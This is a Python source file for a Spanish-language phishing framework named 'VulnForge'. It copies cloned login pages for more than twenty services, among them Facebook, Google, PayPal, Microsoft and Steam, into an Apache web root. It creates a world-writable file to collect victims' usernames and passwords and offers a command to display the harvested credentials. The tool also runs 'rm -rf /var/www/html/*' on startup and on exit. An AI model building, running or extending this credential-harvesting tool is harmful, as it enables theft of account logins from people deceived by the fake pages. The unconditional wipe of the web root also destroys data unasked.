import os
import random
import time
import colorama
from colorama import Fore
import socket
import subprocess
import nmap

fbs_list=["####Phishing fb_security", "commands:",
			"install : Prepara el phishing en tu servidor apache2",
			"log : visualiza el fichero con los usuarios y contraseñas",
			"exit : borra los ficheros y cierra la sesion", 
			"save_session : salir sin borrar la sesion"]

class Banners():
	def Banner():
		try:
			main = random.choice(["cat ./banners/ban01.txt", "cat ./banners/ban02.txt",
				"cat ./banners/ban03.txt", "cat ./banners/ban04.txt"])
			colors = random.choice([Fore.RED, Fore.YELLOW, Fore.BLUE, Fore.GREEN, Fore.WHITE, 
				Fore.MAGENTA])
			print(colors+"")
			os.system(main)
		except Exception as a:
			print(a)
	def creator():
		print(Fore.RED+"Creador: "+Fore.GREEN+"DigitalNinja00")
		print(Fore.RED+"github: "+Fore.YELLOW+"https://github.com/DigitalNinja00/")
	def clear():
		try:
			os.system("rm -rf /var/www/html/*")
		except OSError as bb:
			print(bb)
class Functions:
	def phish_list():
		try:
			subprocess.run(["cat", "./path/phishing.txt"])
		except OSError as error:
			print(error)
	def pwd():
		try:
			subprocess.run(["pwd"])
		except OSError as error:
			print(error)
	def cd(ruta):
		try:
			os.chdir(ruta)
		except OSError as error:
			print(error)
	def ls_only():
		try:
			more = os.listdir()
			for x in more:
				print(x)
		except OSError as error:
			print(error)
	def ls_path(directorio):
		try:
			hack = os.listdir(directorio)
			for y in hack:
				print(y)
		except OSError as error:
			print(error)
'''
class NmapFunctions:
	def simple_scan(host):
		try:
			print(Fore.YELLOW+"["+Fore.RED+"+"+Fore.YELLOW+"] "+Fore.RED+"Iniciando escaneo...."+Fore.RED)
			nm = nmap.PortScanner()
			nm.scan(hosts=host, arguments='-p 1-1024')
			for host in nm.all_hosts():
				print('Hostname : %s (%s)' % (host, nm[host].hostname()))
				print('Estado : %s' % nm[host].state())
				for protocolo in nm[host].all_protocols():
					print('Protocolo : %s' % protocolo)
					puertos = nm[host][protocolo].keys()
					for puerto in puertos:
						print('Puerto : %s\tEstado : %s' % (puerto, nm[host][protocolo][puerto]['state']))
		except OSError as error:
			print("Error al realizar escanner", error)
'''
class Phishing_functions_help:
	def adobe_help():
		try:
			for adobe in fbs_list:
				print(adobe)

		except OSError as error:
			print("Error al imprimir la ayuda", error)

class Mensajeria:
	def icons(mensaje):
		print(Fore.YELLOW+"["+Fore.RED+"+"+Fore.YELLOW+"] "+Fore.RESET+mensaje)

class Installer:
	def view_usernames():
		try:
			print("[*] Registro de claves ###########")
			subprocess.run(["cat", "/var/www/html/usernames.txt"])
			print("###################")
		except OSError:
			print("Error al imprimir registro de claves")
	def delete_session():
		try:
			Mensajeria.icons("Borrando ficheros de /var/www/html/*")
			time.sleep(1)
			os.system("rm -rf /var/www/html/*")
		except OSError:
			print("Error al borrar archivos")
		try:
			Mensajeria.icons("Apagando servidor apache2")
			subprocess.run(["systemctl", "stop", "apache2.service"])
		except OSError:
			print("")
	def facebook_seg(locate):
		try:
			Mensajeria.icons("Iniciando servidor apache2")
			time.sleep(1)
			subprocess.run(["systemctl", "start", "apache2.service"])
			Mensajeria.icons("Url : http://127.0.0.1:80")
		except OSError:
			print("Error al iniciar servidor apache2")
		try:
			Mensajeria.icons("Copiando archivos a /var/www/html")
			time.sleep(1)
			os.system(f"cp -r ./sites/{locate}/* /var/www/html")
		except OSError as main:
			print("Error al copiar ficheros a /var/www/html", main)
		try:
			Mensajeria.icons("Creando ficheros usernames.txt")
			time.sleep(1)
			subprocess.run(["touch", "/var/www/html/usernames.txt"])
		except OSError as error:
			print("Error al crear fichero usernames.txt")
		try:
			Mensajeria.icons("Dando permisos de ejecucion a usernames.txt")
			time.sleep(1)
			subprocess.run(["chmod", "666", "/var/www/html/usernames.txt"])
		except OSError as tty:
			print("Error al dar permisos a usernames.txt")
Banners.Banner()
Banners.creator()
Banners.clear()
#NmapFunctions.simple_scan('192.168.8.1')
while True:
	principal = input(Fore.BLUE+"VulnForge>> "+Fore.RESET).split()
	#de 1
	if(len(principal)==1):
		if(principal[0]=="list"):
			print("Use | list <argument> \n example : list phishing")
		if(principal[0]=="pwd"):
			Functions.pwd()
		if(principal[0]=="cd"):
			print("use | cd <path> \nexample: cd /usr/share")
		if(principal[0]=="ls"):
			Functions.ls_only()
		if(principal[0]=="load" or principal[0]=="LOAD"):
			print("use | load <fichero> \n example : load /phish/adobe")
		if(principal[0]=="help"):
			print("read README")
		if(principal[0]=="exit"):
			print(Fore.RED+"Cerrando programa ....."+Fore.RESET)
			time.sleep(2)
			break
	#de 2
	if(len(principal)==2):
		if(principal[0]=="list"):
			if(principal[1]=="phishing"):
				Functions.phish_list()
			else:
				print("list : command not found")
		if(principal[0]=="help"):
			if(principal[1]=="list"):
				espermatozoide=["list command", "============", 
				"example:", "============","list phishing"]
				for ovulo in espermatozoide:
					print(ovulo)
		if(principal[0]=="cd"):
			Functions.cd(principal[1])
		if(principal[0]=="ls"):
			Functions.ls_path(principal[1])
		if(principal[0]=="load" or principal[0]=="LOAD"):
			#seccion de phishing
			if(principal[1]=="/phish/adobe"):
				while True:
					main = Fore.RED+"/phish/adobe"
					adobe = input(Fore.BLUE+"(%s)"%main+Fore.BLUE+">>> "+Fore.RESET).split()
					if(len(adobe)==1):
						if(adobe[0]=="install"):
							Installer.facebook_seg("adobe")
						if(adobe[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(adobe[0]=="log"):
							Installer.view_usernames()
						if(adobe[0]=="exit"):
							Installer.delete_session()
							break
						if(adobe[0]=="save_session"):
							break
					if(len(adobe)>1):
						print(Fore.RED+"Comando Invalido"+Fore.RESET)
			if(principal[1]=="/phish/fb_security"):
				while True:
					manager=Fore.RED+"/phish/fb_security"
					putoamo=input(Fore.BLUE+"(%s)"%manager+Fore.BLUE+">>> "+Fore.RESET).split()
					if(len(putoamo)==1):
						if(putoamo[0]=="install"):
							Installer.facebook_seg("fb_security")
						if(putoamo[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(putoamo[0]=="log"):
							Installer.view_usernames()
						if(putoamo[0]=="exit"):
							Installer.delete_session()
							break
						if(putoamo[0]=="save_session"):
							break
					if(len(putoamo)>1):
						print(Fore.RED+"Comando Invalido"+Fore.RESET)
			if(principal[1]=="/phish/instagram"):
				while True:
					p1=Fore.RED+"/phish/instagram"
					p2=input(Fore.BLUE+"(%s)"%p1+Fore.BLUE+">>> "+Fore.RESET).split()
					if(len(p2)==1):
						if(p2[0]=="install"):
							Installer.facebook_seg("instagram")
						if(p2[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(p2[0]=="log"):
							Installer.view_usernames()
						if(p2[0]=="exit"):
							Installer.delete_session()
							break
						if(p2[0]=="save_session"):
							break
					if(len(p2)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/playstation"):
				while True:
					ps3=Fore.RED+"/phish/playstation"
					ps4=input(Fore.BLUE+"(%s)"%ps3+Fore.BLUE+">>> "+Fore.RESET).split()
					if(len(ps4)==1):
						if(ps4[0]=="install"):
							Installer.facebook_seg("playstation")
						if(ps4[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(ps4[0]=="log"):
							Installer.view_usernames()
						if(ps4[0]=="exit"):
							Installer.delete_session()
							break
						if(ps4[0]=="save_session"):
							break
					if(len(ps4)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/tiktok"):
				while True:
					tren=Fore.RED+"/phish/tiktok"
					persona=input(Fore.BLUE+"(%s)"%tren+Fore.BLUE+">>> "+Fore.RESET).split()
					if(len(persona)==1):
						if(persona[0]=="install"):
							Installer.facebook_seg("tiktok")
						if(persona[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(persona[0]=="log"):
							Installer.view_usernames()
						if(persona[0]=="exit"):
							Installer.delete_session()
							break
						if(persona[0]=="save_session"):
							break
					if(len(persona)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/protonmail"):
				while True:
					proton=Fore.RED+"/phish/protonmail"
					mail=input(Fore.BLUE+"(%s)"%proton+Fore.BLUE+">>> "+Fore.RESET).split()
					if(len(mail)==1):
						if(mail[0]=="install"):
							Installer.facebook_seg("protonmail")
						if(mail[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(mail[0]=="log"):
							Installer.view_usernames()
						if(mail[0]=="exit"):
							Installer.delete_session()
							break
						if(mail[0]=="save_session"):
							break
					if(len(mail)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/twitch"):
				while True:
					directorio=Fore.RED+"/phish/twitch"
					streamer=input(Fore.BLUE+"(%s)"%directorio+Fore.BLUE+">>> "+Fore.RESET).split()
					if(len(streamer)==1):
						if(streamer[0]=="install"):
							Installer.facebook_seg("twitch")
						if(streamer[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(streamer[0]=="log"):
							Installer.view_usernames()
						if(streamer[0]=="exit"):
							Installer.delete_session()
							break
						if(streamer[0]=="save_session"):
							break
					if(len(streamer)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/linkedin"):
				while True:
					link=Fore.RED+"/phish/linkedin"
					edin=input(Fore.BLUE+"(%s)"%link+Fore.BLUE+">>> "+Fore.RESET).split()
					if(len(edin)==1):
						if(edin[0]=="install"):
							Installer.facebook_seg("linkedin")
						if(edin[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(edin[0]=="log"):
							Installer.view_usernames()
						if(edin[0]=="exit"):
							Installer.delete_session()
							break
						if(edin[0]=="save_session"):
							break
					if(len(edin)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/discord"):
				while True:
					x=Fore.RED+"/phish/discord"
					y=input(Fore.BLUE+"(%s)"%x+Fore.BLUE+">>> "+Fore.RESET).split()
					if(len(y)==1):
						if(y[0]=="install"):
							Installer.facebook_seg("discord")
						if(y[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(y[0]=="log"):
							Installer.view_usernames()
						if(y[0]=="exit"):
							Installer.delete_session()
							break
						if(y[0]=="save_session"):
							break
					if(len(y)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/mediafire"):
				while True:
					media=Fore.RED+"/phish/mediafire";
					fire=input(Fore.BLUE+"(%s)"%media+Fore.BLUE+">>> "+Fore.RESET).split()
					if(len(fire)==1):
						if(fire[0]=="install"):
							Installer.facebook_seg("mediafire")
						if(fire[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(fire[0]=="log"):
							Installer.view_usernames()
						if(fire[0]=="exit"):
							Installer.delete_session()
							break
						if(fire[0]=="save_session"):
							break
					if(len(fire)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/reddit"):
				while True:
					red=Fore.RED+"/phish/reddit"
					it=input(Fore.BLUE+"(%s)"%red+Fore.BLUE+">>> "+Fore.RESET).split()
					if(len(it)==1):
						if(it[0]=="install"):
							Installer.facebook_seg("reddit")
						if(it[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(it[0]=="log"):
							Installer.view_usernames()
						if(it[0]=="exit"):
							Installer.delete_session()
							break
						if(it[0]=="save_session"):
							break
					if(len(it)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/dropbox"):
				while True:
					drop=Fore.RED+"/phish/dropbox"
					box=input(Fore.BLUE+"(%s)"%drop+Fore.BLUE+">>> "+Fore.RESET).split()
					if(len(box)==1):
						if(box[0]=="install"):
							Installer.facebook_seg("dropbox")
						if(box[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(box[0]=="log"):
							Installer.view_usernames()
						if(box[0]=="exit"):
							Installer.delete_session()
							break
						if(box[0]=="save_session"):
							break
					if(len(box)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/google"):
				while True:
					goo=Fore.RED+"/phish/google"
					gle=input(Fore.BLUE+"(%s)"%goo+Fore.BLUE+">>> "+Fore.RESET).split()
					if(len(gle)==1):
						if(gle[0]=="install"):
							Installer.facebook_seg("google")
						if(gle[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(gle[0]=="log"):
							Installer.view_usernames()
						if(gle[0]=="exit"):
							Installer.delete_session()
							break
						if(gle[0]=="save_session"):
							break
					if(len(gle)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/microsoft"):
				while True:
					micro=Fore.RED+"/phish/microsoft"
					soft=input(Fore.BLUE+"(%s)"%micro+Fore.BLUE+">>> "+Fore.RESET).split()
					if(len(soft)==1):
						if(soft[0]=="install"):
							Installer.facebook_seg("microsoft")
						if(soft[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(soft[0]=="log"):
							Installer.view_usernames()
						if(soft[0]=="exit"):
							Installer.delete_session()
							break
						if(soft[0]=="save_session"):
							break
					if(len(soft)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/roblox"):
				while True:
					ro=Fore.RED+"/phish/roblox"
					blox=input(Fore.BLUE+"(%s)"%ro+Fore.BLUE+">>> "+Fore.RESET).split()
					if(len(blox)==1):
						if(blox[0]=="install"):
							Installer.facebook_seg("roblox")
						if(blox[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(blox[0]=="log"):
							Installer.view_usernames()
						if(blox[0]=="exit"):
							Installer.delete_session()
							break
						if(blox[0]=="save_session"):
							break
					if(len(blox)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/ebay"):
				while True:
					e=Fore.RED+"/phish/ebay"
					bay=input(Fore.BLUE+"(%s)"%e+Fore.BLUE+">>> "+Fore.RESET).split()
					if(len(bay)==1):
						if(bay[0]=="install"):
							Installer.facebook_seg("ebay")
						if(bay[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(bay[0]=="log"):
							Installer.view_usernames()
						if(bay[0]=="exit"):
							Installer.delete_session()
							break
						if(bay[0]=="save_session"):
							break
					if(len(bay)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/netflix"):
				while True:
					net=Fore.RED+"/phish/netflix"
					flix=input(Fore.BLUE+"(%s)"%net+Fore.BLUE+">>> "+Fore.RESET).split()
					if(len(flix)==1):
						if(flix[0]=="install"):
							Installer.facebook_seg("netflix")
						if(flix[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(flix[0]=="log"):
							Installer.view_usernames()
						if(flix[0]=="exit"):
							Installer.delete_session()
							break
						if(flix[0]=="save_session"):
							break
					if(len(flix)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/snapchat"):
				while True:
					snap=Fore.RED+"/phish/snapchat"
					chat=input(Fore.BLUE+"(%s)"%snap+Fore.BLUE+">>> "+Fore.RESET).split()
					if(len(chat)==1):
						if(chat[0]=="install"):
							Installer.facebook_seg("snapchat")
						if(chat[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(chat[0]=="log"):
							Installer.view_usernames()
						if(chat[0]=="exit"):
							Installer.delete_session()
							break
						if(chat[0]=="save_session"):
							break
					if(len(chat)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/wordpress"):
				while True:
					word=Fore.RED+"/phish/wordpress"
					press=input(Fore.BLUE+"(%s)"%word+Fore.BLUE+">>> "+Fore.RESET).split()
					if(len(press)==1):
						if(press[0]=="install"):
							Installer.facebook_seg("wordpress")
						if(press[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(press[0]=="log"):
							Installer.view_usernames()
						if(press[0]=="exit"):
							Installer.delete_session()
							break
						if(press[0]=="save_session"):
							break
					if(len(press)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/facebook"):
				while True:
					face=Fore.RED+"/phish/facebook"
					book=input(Fore.BLUE+"(%s)"%face+Fore.BLUE+">>> "+Fore.RESET).split();
					if(len(book)==1):
						if(book[0]=="install"):
							Installer.facebook_seg("facebook")
						if(book[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(book[0]=="log"):
							Installer.view_usernames()
						if(book[0]=="exit"):
							Installer.delete_session()
							break
						if(book[0]=="save_session"):
							break
					if(len(book)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/spotify"):
				while True:
					spo=Fore.RED+"/phish/spotify"
					tify=input(Fore.BLUE+"(%s)"%spo+Fore.BLUE+">>> "+Fore.RESET).split();
					if(len(tify)==1):
						if(tify[0]=="install"):
							Installer.facebook_seg("spotify")
						if(tify[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(tify[0]=="log"):
							Installer.view_usernames()
						if(tify[0]=="exit"):
							Installer.delete_session()
							break
						if(tify[0]=="save_session"):
							break
					if(len(tify)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/paypal"):
				while True:
					spo=Fore.RED+"/phish/paypal"
					tify=input(Fore.BLUE+"(%s)"%spo+Fore.BLUE+">>> "+Fore.RESET).split();
					if(len(tify)==1):
						if(tify[0]=="install"):
							Installer.facebook_seg("paypal")
						if(tify[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(tify[0]=="log"):
							Installer.view_usernames()
						if(tify[0]=="exit"):
							Installer.delete_session()
							break
						if(tify[0]=="save_session"):
							break
					if(len(tify)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/stackoverflow"):
				while True:
					spo=Fore.RED+"/phish/stackoverflow"
					tify=input(Fore.BLUE+"(%s)"%spo+Fore.BLUE+">>> "+Fore.RESET).split();
					if(len(tify)==1):
						if(tify[0]=="install"):
							Installer.facebook_seg("stackoverflow")
						if(tify[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(tify[0]=="log"):
							Installer.view_usernames()
						if(tify[0]=="exit"):
							Installer.delete_session()
							break
						if(tify[0]=="save_session"):
							break
					if(len(tify)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/fb_messenger"):
				while True:
					spo=Fore.RED+"/phish/fb_messenger"
					tify=input(Fore.BLUE+"(%s)"%spo+Fore.BLUE+">>> "+Fore.RESET).split();
					if(len(tify)==1):
						if(tify[0]=="install"):
							Installer.facebook_seg("fb_messenger")
						if(tify[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(tify[0]=="log"):
							Installer.view_usernames()
						if(tify[0]=="exit"):
							Installer.delete_session()
							break
						if(tify[0]=="save_session"):
							break
					if(len(tify)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/pinterest"):
				while True:
					spo=Fore.RED+"/phish/pinterest"
					tify=input(Fore.BLUE+"(%s)"%spo+Fore.BLUE+">>> "+Fore.RESET).split();
					if(len(tify)==1):
						if(tify[0]=="install"):
							Installer.facebook_seg("pinterest")
						if(tify[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(tify[0]=="log"):
							Installer.view_usernames()
						if(tify[0]=="exit"):
							Installer.delete_session()
							break
						if(tify[0]=="save_session"):
							break
					if(len(tify)>1):
						print(Fore.RED+"Comando Invalido")
			if(principal[1]=="/phish/steam"):
				while True:
					spo=Fore.RED+"/phish/steam"
					tify=input(Fore.BLUE+"(%s)"%spo+Fore.BLUE+">>> "+Fore.RESET).split();
					if(len(tify)==1):
						if(tify[0]=="install"):
							Installer.facebook_seg("steam")
						if(tify[0]=="help"):
							Phishing_functions_help.adobe_help()
						if(tify[0]=="log"):
							Installer.view_usernames()
						if(tify[0]=="exit"):
							Installer.delete_session()
							break
						if(tify[0]=="save_session"):
							break
					if(len(tify)>1):
						print(Fore.RED+"Comando Invalido")
			else:
				Functions.phish_list()
				print(Fore.RED+"use: LOAD <PATH>")
